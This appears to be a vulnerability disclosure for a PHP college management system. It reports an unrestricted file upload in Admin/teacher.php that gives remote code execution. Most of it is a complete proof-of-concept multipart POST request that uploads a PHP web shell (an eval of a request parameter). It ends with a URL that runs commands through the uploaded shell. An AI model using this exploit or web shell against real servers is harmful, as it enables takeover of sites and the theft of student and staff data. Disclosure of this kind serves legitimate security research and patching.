# college-management-system-in-php has remote code excute vulnerability and unrestricted upload  vulnerability in teacher.php

## supplier 
https://code-projects.org/college-management-system-in-php-with-source-code/
## Vulnerability parameter
teacher.php

## describe

The system's teacher.php. php has a vulnerability for arbitrary file upload, which can upload Trojan files and execute malicious code.

**Code analysis**    

When the value of   $FILES parameter is obtained in function , it will be uploaded to /images.

![Image](https://github.com/user-attachments/assets/418f72f8-492e-4d2a-a172-0ee4aa52105e)



## POC

```
POST /Admin/teacher.php HTTP/1.1
Host: college-management-system
Content-Length: 3723
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://college-management-system
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0kx8SRubJh8uHuVl
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://college-management-system/admission.php/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="first_name"

1
------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="middle_name"

1
------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="last_name"

1
------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="father_name"

1
------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="email"

123456@qq.com
------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="mobile_no"

1
------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="course_code"

Select Course
------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="session"

Select Session
------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="profile_image"; filename="shellRce.php"
Content-Type: application/octet-stream

<?php
@eval($_REQUEST['shell']);
?>
------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="prospectus_issued"

Select Option
------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="prospectus_amount"

Select Option
------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="form_b"


------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="applicant_status"

Select Option
------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="application_status"

Select Option
------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="cnic"


------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="dob"


------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="other_phone"


------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="gender"

Select Gender
------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="permanent_address"


------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="current_address"


------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="place_of_birth"


------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="matric_complition_date"


------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="matric_awarded_date"


------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="matric_certificate"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="fa_complition_date"


------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="fa_awarded_date"


------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="fa_certificate"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="ba_complition_date"


------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="ba_awarded_date"


------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="ba_certificate"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="password"

1
------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="role"

Teacher
------WebKitFormBoundary0kx8SRubJh8uHuVl
Content-Disposition: form-data; name="btn_save"

&#25552;&#20132;
------WebKitFormBoundary0kx8SRubJh8uHuVl--

```

**Result**

```
http://college-management-system/Admin/images/shellRce.php?shell=phpinfo();
```

![Image](https://github.com/user-attachments/assets/2cb723dc-a11d-4f2a-9473-63c13e070cbb)

![Image](https://github.com/user-attachments/assets/aa1d297e-13f8-4026-b26a-236ec6b41472)